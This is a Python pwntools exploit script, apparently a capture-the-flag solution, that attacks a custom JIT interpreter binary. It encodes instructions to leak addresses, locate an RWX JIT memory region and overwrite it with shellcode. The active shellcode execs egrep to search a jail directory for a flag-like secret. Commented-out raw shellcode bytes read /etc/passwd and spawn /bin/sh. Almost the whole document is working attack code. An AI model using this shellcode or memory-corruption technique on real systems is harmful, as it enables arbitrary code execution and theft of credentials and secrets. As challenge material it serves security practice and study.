#!/usr/bin/env python3

import os
import struct
from pwn import *

context.arch = "amd64"

def generate_number(num):
	code  = "iqiq"
	code += "ij"
	for i in range(64):
		if (num >> i) & 1:
			code += "+rj"
		code += "*jq"
	return code

def generate_shellcode(shellcode):
	while len(shellcode) % 8 > 0:
		shellcode += b"\x00"

	code = ""

	for i in range(0, len(shellcode), 8):
		num = struct.unpack( "<Q", shellcode[ i : i+8 ] )[ 0 ]
		code += "^rr^jj^qq" + generate_number(num) + "pr"

	return code



jit_enable = "00000000000000000000"

skek = 0xc0000b2000
leak_addr = 0xc0000d5cc0
state_ptr = 0xc0000d5f60
skek_offset = 0xc0000909a0 - 0xc0000908f0
shellcode_offset = 0x7f36a384ef7d - 0x7f36a384e000

# r j q l
code = jit_enable
code += generate_number( ( leak_addr - skek ) // 8 + 1 )
code += "mLrPl"
# l now is mmaped-rwx chunk with JIT code
code += "^qq^rr^jj" # zero in 3 gr

code += generate_number( ( state_ptr - skek ) // 8 + 1 )
# r is offset
# code += "?"
code += "^LL+Lr"
code += "Pq"
for i in range(skek_offset):
	code += "iq"
code += "^rr^jj^LL"
code += "pq^qq"
code += generate_number( skek )
code += "Pq-qr^rr"
for i in range(8):
	code += "ir"
code += "/qr"
code += "mLq"
code += "^rr^qq^jj"
code += generate_number(0x6000 - 0x492a)
code += "-lrpl^LL"
code += "^rr^qq^jj"
code = code + "0" * (16382 - len(code))
code += "ir"

code += "cr#"
code += "^rr^rr^rr^rr^rr^rr^rr^rr^rr^rr^rr^rr^rr^rr^rr^rr^rr^rr^rr^rr^rr^rr^rr^rr^rr^rr^rr^rr^rr^rr^rr^rr^rr^rr"
code += "mLL"

shellcode = shellcraft.pushstr( "/bin/egrep" )
shellcode += "mov rdi, rsp;"
shellcode += shellcraft.pushstr_array( "rsi", ["/bin/egrep", "-r", '[A-Z0-9]{31}=', './jail'])
shellcode += "mov rdx, 0;"
shellcode += "mov rax, 59;"
shellcode += "syscall;"

# print( shellcode )

shellcode = asm( shellcode )

# print( "shellcode: ", len( shellcode ) )

# shellcode = b"\xeb\x2f\x5f\x6a\x02\x58\x48\x31\xf6\x0f\x05\x66\x81\xec\xef\x0f\x48\x8d\x34\x24\x48\x97\x48\x31\xd2\x66\xba\xef\x0f\x48\x31\xc0\x0f\x05\x6a\x01\x5f\x48\x92\x6a\x01\x58\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xcc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
code += generate_shellcode(b"\x90" * 16 + shellcode ) # b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" )#b"\xeb\x2f\x5f\x6a\x02\x58\x48\x31\xf6\x0f\x05\x66\x81\xec\xef\x0f\x48\x8d\x34\x24\x48\x97\x48\x31\xd2\x66\xba\xef\x0f\x48\x31\xc0\x0f\x05\x6a\x01\x5f\x48\x92\x6a\x01\x58\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xcc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
# # 

code = code + "0" * (32768 - len(code))
fd = open( "code", "wb" )
fd.write( code.encode() )
fd.close()

p = process( ["../../runner", code ])
p.interactive()

# r - accum
# j - power of 2
# q - 2

# 00000000000000000000iqiqij+rj*jq*jq*jq+rj*jq+rj*jq*jq*jq+rj*jq+rj*jq+rj*jq*jq+rj*jq+rj*jq+rj*jq*jq*jq*jq*jq*jq*jq*jq*jq*jq*jq*jq*jq*jq*jq*jq*jqmLrPr?